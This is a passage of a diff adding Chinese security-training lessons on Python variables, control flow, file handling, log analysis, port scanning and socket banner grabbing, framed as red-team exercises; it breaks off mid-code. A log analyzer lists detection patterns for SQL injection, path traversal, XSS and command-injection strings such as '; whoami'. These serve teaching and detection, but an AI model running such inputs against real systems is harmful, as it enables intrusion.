@@ -22782,3 +22782,4838 @@ server {
 <li>James Kettle systematized request smuggling attacks in 2019 — affecting virtually all major web infrastructure</li>
 </ul>
 `;
+
+
+// ============================================================
+// ALL MODULES - REWRITTEN SCENARIO-DRIVEN CONTENT
+// (Programming, Cryptography, Networking, Pentesting, Malware, CTF)
+// ============================================================
+
+SECTION_CONTENT["programming"] = "<!-- ============================================================= -->\r\n\r\n<h2>变量与类型系统</h2>\r\n<h3>prog-01 · Python核心语法 · 构建你的第一个安全工具</h3>\r\n\r\n<div class=\"callout default\">\r\n<div class=\"callout-title\">🎯 本章场景</div>\r\n<p>你刚加入一家安全公司的红队。导师给你的第一个任务是：写一个脚本，连接到远程服务器，抓取它返回的\"横幅\"（Banner）信息——也就是服务自报家门的那行文字。要完成这个任务，你首先得学会如何<strong>用变量存储信息</strong>、<strong>用类型区分数据</strong>。</p>\r\n</div>\r\n\r\n<h3>为什么安全工程师需要懂变量？</h3>\r\n\r\n<p>想象你正在分析一次网络攻击。你需要记录攻击者的 IP 地址、使用的端口号、发送的恶意载荷……这些信息在代码里都用<strong>变量</strong>来存储。变量就像贴了标签的盒子——你给它取个名字，把数据放进去，以后随时可以拿出来用。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 你的第一个安全脚本：记录目标信息\r\ntarget_ip = \"192.168.1.100\"\r\ntarget_port = 80\r\nservice_name = \"Apache/2.4.41\"\r\nis_vulnerable = True\r\n\r\nprint(f\"目标: {target_ip}:{target_port}\")\r\nprint(f\"服务: {service_name}\")\r\nprint(f\"是否存在漏洞: {is_vulnerable}\")</code></pre></div>\r\n\r\n<p>运行这段代码，你会看到：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">目标: 192.168.1.100:80\r\n服务: Apache/2.4.41\r\n是否存在漏洞: True</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"0\"></div>\r\n\r\n<h3>Python 的四大基本类型</h3>\r\n\r\n<table>\r\n<thead><tr><th>类型</th><th>名称</th><th>安全场景举例</th><th>示例</th></tr></thead>\r\n<tbody>\r\n<tr><td><code>str</code></td><td>字符串</td><td>IP地址、用户名、漏洞描述</td><td><code>\"10.0.0.1\"</code></td></tr>\r\n<tr><td><code>int</code></td><td>整数</td><td>端口号、状态码、字节数</td><td><code>443</code></td></tr>\r\n<tr><td><code>float</code></td><td>浮点数</td><td>扫描耗时、风险评分</td><td><code>3.14</code></td></tr>\r\n<tr><td><code>bool</code></td><td>布尔值</td><td>是否有漏洞、端口是否开放</td><td><code>True</code></td></tr>\r\n</tbody>\r\n</table>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">ip = \"192.168.1.1\"\r\nport = 22\r\nscan_time = 0.45\r\nport_open = False\r\n\r\nprint(type(ip))        # &lt;class 'str'&gt;\r\nprint(type(port))      # &lt;class 'int'&gt;\r\nprint(type(scan_time)) # &lt;class 'float'&gt;\r\nprint(type(port_open)) # &lt;class 'bool'&gt;</code></pre></div>\r\n\r\n<div class=\"callout info\">\r\n<div class=\"callout-title\">提示</div>\r\n<p>Python 是<strong>动态类型</strong>语言——你不需要像 C 语言那样声明类型，解释器会根据赋值自动推断。但这不代表类型不重要：把一个字符串当整数用，是安全工具里最常见的 Bug 来源之一。</p>\r\n</div>\r\n\r\n<h3>字符串：安全工程师最好的朋友</h3>\r\n\r\n<p>在安全领域，你处理最多的数据类型就是字符串。IP 地址、HTTP 请求头、日志记录、恶意载荷——全是字符串。</p>\r\n\r\n<h4>字符串基础操作</h4>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 字符串拼接 —— 构造完整的 URL\r\nprotocol = \"https\"\r\ndomain = \"target-site.com\"\r\npath = \"/admin/login\"\r\nfull_url = f\"{protocol}://{domain}{path}\"\r\nprint(full_url)  # https://target-site.com/admin/login\r\n\r\n# 字符串分割 —— 解析 IP:端口 格式\r\naddress = \"10.0.0.5:8080\"\r\nip, port = address.split(\":\")\r\nprint(f\"IP={ip}, Port={port}\")\r\n\r\n# 字符串查找 —— 在 Banner 中搜索关键字\r\nbanner = \"SSH-2.0-OpenSSH_7.9p1 Debian-10\"\r\nif \"OpenSSH\" in banner:\r\n    print(\"检测到 OpenSSH 服务\")\r\n\r\n# 提取版本号\r\nidx = banner.index(\"OpenSSH_\") + 8\r\nversion = banner[idx:banner.index(\" \", idx)]\r\nprint(f\"版本: {version}\")  # 7.9p1\r\n\r\n# strip() —— 清理用户输入\r\nuser_input = \"  192.168.1.1  \\n\"\r\nclean_ip = user_input.strip()\r\n\r\n# encode() / decode() —— 处理编码问题\r\nraw_bytes = \"你好\".encode(\"utf-8\")\r\nprint(raw_bytes)  # b'\\xe4\\xbd\\xa0\\xe5\\xa5\\xbd'\r\ntext_back = raw_bytes.decode(\"utf-8\")\r\n\r\n# 十六进制解码 —— 分析网络数据包时常用\r\nhex_str = \"48656c6c6f\"\r\ndecoded = bytes.fromhex(hex_str).decode(\"ascii\")\r\nprint(decoded)  # Hello</code></pre></div>\r\n\r\n<div class=\"callout warn\">\r\n<div class=\"callout-title\">警告</div>\r\n<p>永远不要用简单的 <code>replace()</code> 来防御 SQL 注入。真正的防御需要参数化查询，后续章节会详细讨论。</p>\r\n</div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"1\"></div>\r\n\r\n<h3>数字类型：端口、状态码与字节</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 端口范围验证\r\nport = 8443\r\nif 0 <= port <= 65535:\r\n    print(f\"端口 {port} 在合法范围内\")\r\n\r\n# 类型转换 —— 用户输入永远是字符串\r\nuser_port = input(\"请输入端口号: \")  # \"80\"\r\nport_number = int(user_port)           # 转为整数\r\n\r\n# 计算子网主机数\r\nsubnet_mask = \"255.255.255.0\"\r\nparts = subnet_mask.split(\".\")\r\nbinary = \"\".join(format(int(p), \"08b\") for p in parts)\r\nhost_bits = binary.count(\"0\")\r\nmax_hosts = 2 ** host_bits - 2\r\nprint(f\"子网最大主机数: {max_hosts}\")  # 254</code></pre></div>\r\n\r\n<h3>列表与字典：组织安全数据</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 列表 —— 待扫描端口\r\ncommon_ports = [21, 22, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 8080]\r\nhigh_ports = [p for p in common_ports if p > 1024]\r\n\r\n# 字典 —— 端口-服务映射\r\nport_services = {\r\n    21: \"FTP\", 22: \"SSH\", 80: \"HTTP\", 443: \"HTTPS\",\r\n    3306: \"MySQL\", 3389: \"RDP\",\r\n}\r\nservice = port_services.get(3389, \"Unknown\")  # \"RDP\"\r\n\r\n# 存储漏洞信息\r\nvuln = {\r\n    \"cve_id\": \"CVE-2021-44228\",\r\n    \"name\": \"Log4Shell\",\r\n    \"cvss_score\": 10.0,\r\n    \"severity\": \"critical\",\r\n}\r\nprint(f\"{vuln['cve_id']}: {vuln['name']} (CVSS {vuln['cvss_score']})\")</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"2\"></div>\r\n\r\n<h3>实战：Banner Grabber 数据存储层</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">\"\"\"Banner Grabber - 数据存储层\"\"\"\r\n\r\nclass ScanTarget:\r\n    def __init__(self, ip, ports):\r\n        self.ip = ip                  # str\r\n        self.ports = ports            # list[int]\r\n        self.timeout = 5.0            # float\r\n        self.results = {}             # dict\r\n\r\n    def add_result(self, port, banner, is_open):\r\n        self.results[port] = {\r\n            \"banner\": banner, \"is_open\": is_open,\r\n            \"service\": self._guess_service(port, banner),\r\n        }\r\n\r\n    def _guess_service(self, port, banner):\r\n        known = {21:\"FTP\", 22:\"SSH\", 80:\"HTTP\", 443:\"HTTPS\", 3306:\"MySQL\"}\r\n        bl = banner.lower() if banner else \"\"\r\n        if \"ssh\" in bl: return \"SSH\"\r\n        if \"apache\" in bl or \"nginx\" in bl: return \"HTTP\"\r\n        return known.get(port, \"unknown\")\r\n\r\n    def get_open_ports(self):\r\n        return [p for p, r in self.results.items() if r[\"is_open\"]]\r\n\r\n    def summary(self):\r\n        return (f\"目标: {self.ip} | \"\r\n                f\"扫描: {len(self.results)} | \"\r\n                f\"开放: {len(self.get_open_ports())}\")\r\n\r\ntarget = ScanTarget(\"192.168.1.100\", [22, 80, 443])\r\ntarget.add_result(22, \"SSH-2.0-OpenSSH_8.2p1\", True)\r\ntarget.add_result(80, \"Apache/2.4.41\", True)\r\ntarget.add_result(443, \"\", False)\r\nprint(target.summary())</code></pre></div>\r\n\r\n<div class=\"callout success\">\r\n<div class=\"callout-title\">动手试试</div>\r\n<p>给 <code>ScanTarget</code> 增加 <code>export_json()</code> 方法，将结果导出为 JSON 字符串。提示：使用 <code>json.dumps()</code>。</p>\r\n</div>\r\n\r\n<h3>变量命名规范</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 糟糕: x, n, flag — 谁知道是什么？\r\n# 专业:\r\ntarget_ip = \"192.168.1.1\"\r\ntarget_port = 80\r\nis_port_open = True\r\nMAX_RETRIES = 3\r\nDEFAULT_TIMEOUT = 5.0</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"3\"></div>\r\n\r\n<h3>本章小结</h3>\r\n<ul>\r\n<li><strong>变量</strong>存储数据，<strong>类型</strong>决定操作方式</li>\r\n<li>四种基本类型：<code>str</code>、<code>int</code>、<code>float</code>、<code>bool</code></li>\r\n<li><strong>字符串</strong>是安全领域最核心的数据类型</li>\r\n<li><strong>列表和字典</strong>组织批量安全数据</li>\r\n<li>外部输入<strong>永远是字符串</strong>，类型转换和验证是基本功</li>\r\n</ul>\r\n\r\n\r\n<!-- ============================================================= -->";
+
+SECTION_CONTENT["prog-01-02"] = "<!-- ============================================================= -->\r\n\r\n<h2>控制流与函数</h2>\r\n<h3>prog-01 · Python核心语法 · 让工具\"活\"起来</h3>\r\n\r\n<div class=\"section-transition\">\r\n<p>上一章我们学会了用<strong>变量和类型</strong>存储安全数据——IP、端口号、Banner 都有了安放之处。但静态的数据不会自己动起来。本章我们将赋予代码\"判断力\"和\"行动力\"：用<strong>条件分支</strong>做决策、用<strong>循环</strong>批量处理、用<strong>函数</strong>封装逻辑，最终完成一个可运行的端口扫描器。</p>\r\n</div>\r\n\r\n<div class=\"callout default\">\r\n<div class=\"callout-title\">🎯 本章场景</div>\r\n<p>导师说：\"Banner Grabber 的数据模型不错，但我要的是<strong>能跑的</strong>工具。给我写一个脚本：输入目标 IP 和端口范围，自动扫描哪些端口是开放的。\" 要做到这些，你需要让代码学会\"选择\"和\"重复\"。</p>\r\n</div>\r\n\r\n<h3>条件判断：让代码做决策</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def check_vulnerability(banner):\r\n    \"\"\"根据 Banner 判断是否存在已知漏洞\"\"\"\r\n    if not banner:\r\n        return \"无法识别 — 无 Banner 信息\"\r\n    bl = banner.lower()\r\n    if \"openssh_7.\" in bl:\r\n        return \"⚠️ OpenSSH 7.x — 可能存在 CVE-2018-15473\"\r\n    elif \"apache/2.4.49\" in bl:\r\n        return \"🔴 Apache 2.4.49 — CVE-2021-41773 路径穿越\"\r\n    elif any(v in bl for v in [\"tomcat/7\", \"tomcat/8\"]):\r\n        return \"🔴 Tomcat 过旧，多个已知漏洞\"\r\n    else:\r\n        return \"✅ 未发现已知漏洞特征\"\r\n\r\nfor b in [\"SSH-2.0-OpenSSH_7.9p1\", \"Apache/2.4.49 (Ubuntu)\", \"nginx/1.20.1\", \"\"]:\r\n    print(f\"'{b}' → {check_vulnerability(b)}\")</code></pre></div>\r\n\r\n<h4>多条件组合：密码强度评估器</h4>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def evaluate_password(password):\r\n    score = 0\r\n    issues = []\r\n    if len(password) >= 16:   score += 3\r\n    elif len(password) >= 12: score += 2\r\n    elif len(password) >= 8:  score += 1\r\n    else: issues.append(\"长度不足 8 位\")\r\n\r\n    checks = [\r\n        any(c.isupper() for c in password),\r\n        any(c.islower() for c in password),\r\n        any(c.isdigit() for c in password),\r\n        any(c in \"!@#$%^&*()\" for c in password),\r\n    ]\r\n    score += sum(checks)\r\n\r\n    if password.lower() in [\"password\", \"123456\", \"qwerty\", \"admin\"]:\r\n        score = 0\r\n        issues.append(\"常见弱密码\")\r\n\r\n    level = \"强\" if score >= 6 else (\"中等\" if score >= 4 else \"弱\")\r\n    return {\"score\": score, \"level\": level, \"issues\": issues}</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"0\"></div>\r\n\r\n<h3>循环：批量处理安全数据</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import random\r\n\r\ndef simulate_port_scan(target_ip, ports):\r\n    \"\"\"模拟端口扫描\"\"\"\r\n    results = {\"open\": [], \"closed\": [], \"filtered\": []}\r\n    for port in ports:\r\n        r = random.random()\r\n        state = \"open\" if r > 0.7 else (\"closed\" if r > 0.3 else \"filtered\")\r\n        results[state].append(port)\r\n        print(f\"  [{state.upper():8s}] {target_ip}:{port}\")\r\n    return results\r\n\r\nresults = simulate_port_scan(\"192.168.1.100\", [21, 22, 80, 443, 3306, 8080])\r\n\r\n# enumerate — 同时获取索引\r\nfor i, port in enumerate([22, 80, 443]):\r\n    print(f\"[{i+1}/3] 端口 {port}\")\r\n\r\n# zip — 并行遍历\r\nfor ip, name in zip([\"10.0.0.1\",\"10.0.0.2\"], [\"web\",\"db\"]):\r\n    print(f\"{ip} = {name}\")</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"1\"></div>\r\n\r\n<h3>函数：封装可复用的安全逻辑</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def parse_banner(banner):\r\n    \"\"\"解析服务 Banner，提取服务名和版本号\"\"\"\r\n    if not banner:\r\n        return {\"service\": \"unknown\", \"version\": None}\r\n    first = banner.split()[0]\r\n    for sep in [\"/\", \"_\"]:\r\n        if sep in first:\r\n            idx = first.index(sep)\r\n            return {\"service\": first[:idx].lower(), \"version\": first[idx+1:]}\r\n    return {\"service\": first.lower(), \"version\": None}\r\n\r\ndef scan_ports(target_ip, ports=None, timeout=3.0, verbose=False):\r\n    \"\"\"端口扫描函数\"\"\"\r\n    if ports is None:\r\n        ports = [21, 22, 80, 443, 3306, 8080]\r\n    if verbose:\r\n        print(f\"[*] 扫描 {target_ip} ({len(ports)} 端口)\")\r\n    open_ports = []\r\n    for port in ports:\r\n        if random.random() > 0.7:\r\n            open_ports.append(port)\r\n            if verbose:\r\n                print(f\"  [+] {target_ip}:{port} OPEN\")\r\n    return open_ports</code></pre></div>\r\n\r\n<div class=\"callout warn\">\r\n<div class=\"callout-title\">警告</div>\r\n<p>永远不要用 <code>def func(lst=[])</code> 作为默认参数！可变默认参数只创建一次，所有调用共享。用 <code>lst=None</code> 然后 <code>if lst is None: lst = []</code>。</p>\r\n</div>\r\n\r\n<h3>实战：完整的端口扫描器</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">\"\"\"Port Scanner v1.0\"\"\"\r\nimport random\r\n\r\nCOMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445,\r\n                3306, 3389, 5432, 8080, 8443]\r\nRISKY_SERVICES = {\r\n    21: (\"FTP\", \"明文传输，易被嗅探\"),\r\n    23: (\"Telnet\", \"明文远程管理，极不安全\"),\r\n    445: (\"SMB\", \"永恒之蓝等勒索病毒常用入口\"),\r\n    3389: (\"RDP\", \"暴力破解和 BlueKeep 漏洞\"),\r\n}\r\n\r\ndef run_scan(target_ip, ports=None, verbose=True):\r\n    if ports is None:\r\n        ports = COMMON_PORTS\r\n    results, warnings = {}, []\r\n    if verbose:\r\n        print(f\"[*] 扫描 {target_ip} ({len(ports)} 端口)\")\r\n\r\n    for i, port in enumerate(ports):\r\n        if verbose and (i+1) % 5 == 0:\r\n            print(f\"    进度: {i+1}/{len(ports)}\")\r\n        if random.random() > 0.75:\r\n            svc = \"unknown\"\r\n            if port in RISKY_SERVICES:\r\n                svc, desc = RISKY_SERVICES[port]\r\n                warnings.append(f\"端口 {port} ({svc}): {desc}\")\r\n            elif port == 22: svc = \"SSH\"\r\n            elif port == 80: svc = \"HTTP\"\r\n            elif port == 443: svc = \"HTTPS\"\r\n            elif port == 3306: svc = \"MySQL\"\r\n            results[port] = {\"service\": svc, \"state\": \"open\"}\r\n\r\n    print(f\"\\n{'='*50}\")\r\n    print(f\"  扫描报告: {target_ip}\")\r\n    for port, info in sorted(results.items()):\r\n        print(f\"  {port:<8} {info['service']:<12} OPEN\")\r\n    if warnings:\r\n        print(f\"\\n  ⚠️  风险警告:\")\r\n        for w in warnings:\r\n            print(f\"    - {w}\")\r\n    print(f\"{'='*50}\")\r\n    return results\r\n\r\nif __name__ == \"__main__\":\r\n    run_scan(\"192.168.1.100\")</code></pre></div>\r\n\r\n<button class=\"practice-link-btn\" onclick=\"navigate('practice'); switchPractice(1)\">▶ 打开编程练习：端口扫描器</button>\r\n\r\n<div class=\"callout success\">\r\n<div class=\"callout-title\">动手试试</div>\r\n<p>给扫描器添加 CIDR 子网展开功能：输入 <code>192.168.1.0/24</code>，自动展开为 254 个 IP 地址。提示：用 <code>ipaddress.ip_network()</code>。</p>\r\n</div>\r\n\r\n<h3>作用域</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">scan_count = 0  # 全局\r\n\r\ndef scan_port(ip, port):\r\n    scan_count = 1  # 局部！和全局的无关\r\n    return True\r\n\r\nscan_port(\"10.0.0.1\", 80)\r\nprint(scan_count)  # 仍然是 0</code></pre></div>\r\n\r\n<div class=\"callout info\">\r\n<div class=\"callout-title\">提示</div>\r\n<p>尽量少用 <code>global</code>。更好的方式是通过返回值或可变对象传递状态。</p>\r\n</div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"2\"></div>\r\n\r\n<h3>本章小结</h3>\r\n<ul>\r\n<li><strong>条件判断</strong>让代码根据数据做决策</li>\r\n<li><strong>循环</strong>批量处理安全数据</li>\r\n<li><strong>函数</strong>封装可复用逻辑</li>\r\n<li>完成了 <strong>Port Scanner v1.0</strong></li>\r\n</ul>\r\n\r\n\r\n<!-- ============================================================= -->";
+
+SECTION_CONTENT["prog-02"] = "<!-- ============================================================= -->\r\n\r\n<h2>文件 I/O 与异常处理</h2>\r\n<h3>prog-02 · 文件与网络编程 · 让工具读写自如</h3>\r\n\r\n<div class=\"section-transition\">\r\n<p>上一章我们学了<strong>控制流与函数</strong>——端口扫描器可以运行了。但它有个致命问题：扫描结果只存在于内存中，程序一关就全丢了。本章我们将让工具具备<strong>读写文件</strong>和<strong>处理错误</strong>的能力。</p>\r\n</div>\r\n\r\n<div class=\"callout default\">\r\n<div class=\"callout-title\">🎯 本章场景</div>\r\n<p>导师递给你一份 5000 行的 Web 服务器日志：\"帮我找出所有可疑请求——SQL 注入、目录遍历、异常高频访问。把结果写入报告文件。\"</p>\r\n</div>\r\n\r\n<h3>文件读取基础</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\"># 读取目标列表（安全写法：用 with 语句）\r\ndef load_targets(filepath):\r\n    targets = []\r\n    with open(filepath, \"r\", encoding=\"utf-8\") as f:\r\n        for line in f:\r\n            line = line.strip()\r\n            if not line or line.startswith(\"#\"):\r\n                continue\r\n            targets.append(line)\r\n    return targets\r\n\r\n# 大文件（GB 级日志） → 逐行读取，节省内存\r\nwith open(\"access.log\", \"r\") as f:\r\n    for line in f:\r\n        process_line(line)  # 逐行处理</code></pre></div>\r\n\r\n<div class=\"callout info\">\r\n<div class=\"callout-title\">提示</div>\r\n<p>处理大日志时<strong>永远不要</strong>用 <code>f.read()</code> 一次性读入——用 <code>for line in f</code> 逐行处理。大文件可能导致内存耗尽。</p>\r\n</div>\r\n\r\n<h3>文件写入：保存扫描报告</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import json\r\nfrom datetime import datetime\r\n\r\ndef save_report(target_ip, results, filepath):\r\n    \"\"\"多格式保存\"\"\"\r\n    # JSON\r\n    report = {\r\n        \"target\": target_ip,\r\n        \"scan_time\": datetime.now().isoformat(),\r\n        \"results\": {str(k): v for k, v in results.items()}\r\n    }\r\n    with open(filepath + \".json\", \"w\", encoding=\"utf-8\") as f:\r\n        json.dump(report, f, ensure_ascii=False, indent=2)\r\n\r\n    # CSV\r\n    with open(filepath + \".csv\", \"w\", encoding=\"utf-8\") as f:\r\n        f.write(\"端口,服务,状态\\n\")\r\n        for port, info in results.items():\r\n            f.write(f\"{port},{info.get('service','?')},{info.get('state','?')}\\n\")\r\n\r\n    # 纯文本\r\n    with open(filepath, \"w\", encoding=\"utf-8\") as f:\r\n        f.write(f\"扫描报告 - {target_ip}\\n\")\r\n        f.write(f\"时间: {datetime.now():%Y-%m-%d %H:%M:%S}\\n\")\r\n        for port, info in sorted(results.items()):\r\n            f.write(f\"端口 {port:>5}: {info.get('service','?'):<12} [{info.get('state','?')}]\\n\")\r\n    print(\"[+] 报告已保存 (JSON/CSV/TXT)\")</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"0\"></div>\r\n\r\n<h3>异常处理</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">def parse_config(filepath):\r\n    \"\"\"解析 key=value 配置文件\"\"\"\r\n    config = {}\r\n    try:\r\n        with open(filepath, \"r\", encoding=\"utf-8\") as f:\r\n            for num, line in enumerate(f, 1):\r\n                line = line.strip()\r\n                if not line or line.startswith(\"#\"):\r\n                    continue\r\n                if \"=\" not in line:\r\n                    print(f\"⚠ 第 {num} 行格式错误: {line}\")\r\n                    continue\r\n                k, v = line.split(\"=\", 1)\r\n                k, v = k.strip(), v.strip()\r\n                if v.isdigit(): config[k] = int(v)\r\n                elif v.lower() in (\"true\",\"false\"): config[k] = v.lower() == \"true\"\r\n                else: config[k] = v\r\n    except FileNotFoundError:\r\n        print(f\"❌ 文件不存在: {filepath}，使用默认配置\")\r\n        config = {\"timeout\": 3, \"max_retries\": 3, \"verbose\": False}\r\n    except PermissionError:\r\n        print(f\"❌ 无权限: {filepath}\")\r\n        raise\r\n    except UnicodeDecodeError:\r\n        print(\"编码错误，尝试 GBK...\")\r\n        with open(filepath, \"r\", encoding=\"gbk\") as f:\r\n            for line in f:\r\n                if \"=\" in line:\r\n                    k, v = line.strip().split(\"=\", 1)\r\n                    config[k.strip()] = v.strip()\r\n    return config</code></pre></div>\r\n\r\n<h4>自定义异常</h4>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">class ScanError(Exception):\r\n    pass\r\n\r\nclass InvalidTargetError(ScanError):\r\n    pass\r\n\r\nclass TargetUnreachableError(ScanError):\r\n    def __init__(self, target, reason=\"连接超时\"):\r\n        super().__init__(f\"目标 {target} 不可达: {reason}\")\r\n\r\ndef validate_target(s):\r\n    import re\r\n    if not re.match(r\"^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}(/\\d{1,2})?$\", s):\r\n        raise InvalidTargetError(f\"格式错误: {s}\")\r\n    for octet in s.split(\"/\")[0].split(\".\"):\r\n        if int(octet) > 255:\r\n            raise InvalidTargetError(f\"IP 段超范围: {octet}\")\r\n    return True</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"1\"></div>\r\n\r\n<h3>实战：Web 日志安全分析器</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">\"\"\"Web Log Analyzer v1.0\"\"\"\r\n\r\nATTACK_PATTERNS = {\r\n    \"SQL注入\": [\"' OR \", \"UNION SELECT\", \"DROP TABLE\", \"1=1\", \"information_schema\"],\r\n    \"目录遍历\": [\"../\", \"..\\\\\", \"/etc/passwd\", \"%2e%2e%2f\"],\r\n    \"XSS攻击\": [\"<script>\", \"javascript:\", \"onerror=\", \"alert(\"],\r\n    \"命令注入\": [\"; ls\", \"| cat\", \"$(\", \"; whoami\"],\r\n}\r\n\r\ndef analyze_log_line(line):\r\n    findings = []\r\n    lu = line.upper()\r\n    for attack_type, patterns in ATTACK_PATTERNS.items():\r\n        for p in patterns:\r\n            if p.upper() in lu:\r\n                findings.append({\"type\": attack_type, \"pattern\": p, \"raw\": line.strip()})\r\n                break\r\n    return findings\r\n\r\ndef analyze_log_file(filepath):\r\n    findings, total = [], 0\r\n    try:\r\n        with open(filepath, \"r\", encoding=\"utf-8\") as f:\r\n            for num, line in enumerate(f, 1):\r\n                total += 1\r\n                for finding in analyze_log_line(line):\r\n                    finding[\"line\"] = num\r\n                    findings.append(finding)\r\n    except FileNotFoundError:\r\n        print(f\"❌ 文件不存在: {filepath}\")\r\n        return None\r\n\r\n    summary = {}\r\n    for f in findings:\r\n        summary[f[\"type\"]] = summary.get(f[\"type\"], 0) + 1\r\n\r\n    return {\"file\": filepath, \"total\": total,\r\n            \"suspicious\": len(set(f[\"line\"] for f in findings)),\r\n            \"findings\": findings, \"summary\": summary}\r\n\r\nreport = analyze_log_file(\"access.log\")\r\nif report:\r\n    print(f\"{report['suspicious']}/{report['total']} 行可疑\")\r\n    for t, c in report[\"summary\"].items():\r\n        print(f\"  {t}: {c} 次\")</code></pre></div>\r\n\r\n<div class=\"callout success\">\r\n<div class=\"callout-title\">动手试试</div>\r\n<p>给日志分析器添加 IP 频率统计功能：找出请求频率最高的 Top 10 IP。提示：用字典 <code>{ip: count}</code>，然后 <code>sorted()</code>。</p>\r\n</div>\r\n\r\n<h3>路径穿越防御</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">from pathlib import Path\r\n\r\ndef safe_file_access(base_dir, user_filename):\r\n    \"\"\"防止路径穿越攻击\"\"\"\r\n    base = Path(base_dir).resolve()\r\n    target = (base / user_filename).resolve()\r\n    try:\r\n        target.relative_to(base)\r\n        return target\r\n    except ValueError:\r\n        raise ValueError(f\"路径穿越攻击: {user_filename}\")\r\n\r\n# safe_file_access(\"/var/www/uploads\", \"image.png\")     → OK\r\n# safe_file_access(\"/var/www/uploads\", \"../../../etc/passwd\") → 拦截</code></pre></div>\r\n\r\n<div class=\"callout warn\">\r\n<div class=\"callout-title\">警告</div>\r\n<p><strong>路径穿越</strong>是 OWASP Top 10 常见漏洞。任何接受用户文件路径的函数必须做路径规范化和边界检查。</p>\r\n</div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"2\"></div>\r\n\r\n<h3>本章小结</h3>\r\n<ul>\r\n<li><code>with open()</code> 安全读写文件，大文件逐行处理</li>\r\n<li><code>try/except</code> 让工具优雅处理错误</li>\r\n<li>路径穿越的原理和防御</li>\r\n<li>完成了 <strong>Web 日志安全分析器</strong></li>\r\n</ul>\r\n\r\n\r\n<!-- ============================================================= -->";
+
+SECTION_CONTENT["prog-02-02"] = "<!-- ============================================================= -->\r\n\r\n<h2>网络编程入门</h2>\r\n<h3>prog-02 · 文件与网络编程 · 用 Socket 连接世界</h3>\r\n\r\n<div class=\"section-transition\">\r\n<p>上一章我们学了<strong>文件 I/O 与异常处理</strong>。但安全工程师的核心战场在<strong>网络</strong>上。本章用 <code>socket</code> 让端口扫描器从\"模拟\"变成真正连接远程主机。</p>\r\n</div>\r\n\r\n<div class=\"callout default\">\r\n<div class=\"callout-title\">🎯 本章场景</div>\r\n<p>导师说：\"你的扫描器用的是 <code>random</code> 模拟。现在我需要你<strong>真正</strong>连接到目标服务器，检测端口是否开放，抓取 Banner。\" 你需要理解网络通信的基石——<strong>Socket</strong>。</p>\r\n</div>\r\n\r\n<h3>Socket：网络通信的门</h3>\r\n\r\n<p>Socket 就像一部电话——拨号（连接 IP:端口），对方接听后双方就可以通话（收发数据）。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">import socket\r\n\r\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # IPv4 + TCP\r\nsock.settimeout(3.0)\r\n\r\ntry:\r\n    sock.connect((\"example.com\", 80))\r\n    sock.send(b\"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\")\r\n    response = sock.recv(4096)\r\n    print(f\"收到 {len(response)} 字节\")\r\n    print(response[:200].decode(\"utf-8\", errors=\"ignore\"))\r\nexcept socket.timeout:\r\n    print(\"⏰ 连接超时\")\r\nexcept ConnectionRefusedError:\r\n    print(\"❌ 连接被拒绝\")\r\nexcept socket.gaierror:\r\n    print(\"❌ DNS 解析失败\")\r\nfinally:\r\n    sock.close()</code></pre></div>\r\n\r\n<div class=\"checkpoint\" data-cp=\"0\"></div>\r\n\r\n<h3>真正的 Banner Grabber</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-python\">\"\"\"Banner Grabber v1.0 — 真实网络版\"\"\"\r\nimport socket\r\n\r\ndef grab_banner(target_ip, port, timeout=3.0):\r\n    result = {\"ip\": target_ip, \"port\": port,\r\n              \"banner\": \"\", \"is_open\": False, \"error\": None}\r\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\r\n    sock.settimeout(timeout)\r\n    try:\r\n        